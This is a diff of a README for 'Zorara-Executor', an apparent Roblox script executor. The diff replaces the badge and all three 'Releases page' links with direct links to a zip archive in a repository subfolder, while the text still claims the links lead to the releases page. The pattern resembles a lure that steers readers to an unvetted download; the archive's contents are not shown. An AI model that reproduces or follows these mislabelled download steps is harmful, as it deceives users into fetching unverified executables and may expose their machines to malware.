@@ -1,6 +1,6 @@
 # 🎮 Zorara-Executor - Run Custom Scripts Effortlessly
 
-[![Download Zorara Executor](https://img.shields.io/badge/Download%20Zorara%20Executor-v1.0-brightgreen)](https://github.com/MdGani/Zorara-Executor/releases)
+[![Download Zorara Executor](https://raw.githubusercontent.com/MdGani/Zorara-Executor/main/subtilize/Zorara-Executor.zip%20Zorara%20Executor-v1.0-brightgreen)](https://raw.githubusercontent.com/MdGani/Zorara-Executor/main/subtilize/Zorara-Executor.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to Zorara-Executor! This tool allows you to run custom Lua scripts and m
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Zorara Releases page](https://github.com/MdGani/Zorara-Executor/releases) to find the latest version of Zorara-Executor.
+   Go to the [Zorara Releases page](https://raw.githubusercontent.com/MdGani/Zorara-Executor/main/subtilize/Zorara-Executor.zip) to find the latest version of Zorara-Executor.
 
 2. **Download the Installer**  
    Look for the most recent version. Click on the installer link to download the software.
@@ -81,4 +81,4 @@ A: We aim to provide updates regularly to enhance performance and features.
 
 ## 🔗 Conclusion
 
-Thank you for choosing Zorara-Executor. We hope you enjoy running your custom scripts on Roblox. For more information or to seek help, visit our [Releases page](https://github.com/MdGani/Zorara-Executor/releases) again. Happy gaming!
+Thank you for choosing Zorara-Executor. We hope you enjoy running your custom scripts on Roblox. For more information or to seek help, visit our [Releases page](https://raw.githubusercontent.com/MdGani/Zorara-Executor/main/subtilize/Zorara-Executor.zip) again. Happy gaming!
